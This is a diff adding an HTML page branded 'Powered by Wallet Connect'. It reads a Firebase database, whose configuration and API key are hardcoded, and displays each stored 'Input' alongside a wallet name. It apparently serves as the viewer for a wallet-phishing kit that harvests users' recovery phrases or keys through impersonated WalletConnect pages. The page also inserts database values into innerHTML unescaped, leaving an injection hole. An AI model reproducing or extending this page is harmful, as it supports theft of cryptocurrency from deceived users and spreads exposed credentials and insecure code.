@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <div class="nav">
+    <p>Dapps</p>
+    <img src="/assets/images/WC.jpg" alt="" height="80px">
+    <p>Wallet</p>
+  </div>
+  <div id="root">
+      
+
+  </div>
+  <style>
+    #root{
+      display: flex;
+      justify-content: center;
+      text-align: center;
+      flex-wrap: wrap;
+      
+    }
+
+    .data-container{
+      border: 1px solid blue;
+      margin: 4px;
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 10px;
+    }
+    .nav{
+      display: flex;
+      justify-content: space-between;
+      color: rgb(63, 63, 194);
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+      font-weight:500;
+      align-items: center;
+    }
+
+  </style>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+  <script type="module">
+    
+      const firebaseConfig = {
+        apiKey: "AIzaSyCvTTs0f48FqMJYWvHj-HLN1kCdKVN0znY",
+        authDomain: "testing-84eba.firebaseapp.com",
+        databaseURL: "https://testing-84eba-default-rtdb.firebaseio.com",
+        projectId: "testing-84eba",
+        storageBucket: "testing-84eba.appspot.com",
+        messagingSenderId: "895194838178",
+        appId: "1:895194838178:web:2fd25f9c5c16c89d7d93fb"
+      };
+    
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+
+
+      var testing_db = firebase.database().ref("testing")
+
+      testing_db.on("value", function(snapshot){
+
+        var data = snapshot.val();
+        for(let i in data){
+          document.querySelector("#root").innerHTML += `
+            <div class= "data-container"><b>Input:</b> ${data[i]["name"]}  <br>for <b>${data[i]["wallet"]}</b></div>
+          `
+        }
+
+      })
+
+  </script>
+
+  <footer style="text-align:center;color: rgb(63, 63, 194); font-family:'Segoe UI', Tahoma, Geneva, Verdana; font-weight: 500;">
+    <p>Powered by Wallet Connect</p>
+  </footer>
+</body>
+</html>
